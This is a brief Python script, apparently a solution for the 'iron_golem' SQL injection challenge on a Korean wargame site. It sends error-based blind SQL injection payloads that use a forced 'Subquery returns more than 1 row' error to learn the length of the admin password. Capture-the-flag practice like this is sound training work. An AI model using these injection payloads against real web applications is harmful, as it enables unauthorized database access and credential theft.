import urllib3
import requests

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?"
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

length = 0

for i in range(0,40):
    query = "pw=' or id='admin' and if(length(pw)={},(select 1 union select 2),1)%23".format(i)
    req = requests.get(url+query, headers=header)
    print(url+query)
    #print("[+] send req length is {}".format(i))
    #print(req.text)
    if "Subquery returns more than 1 row" in req.text:
        length = i
        break

print("password length is : ",length)
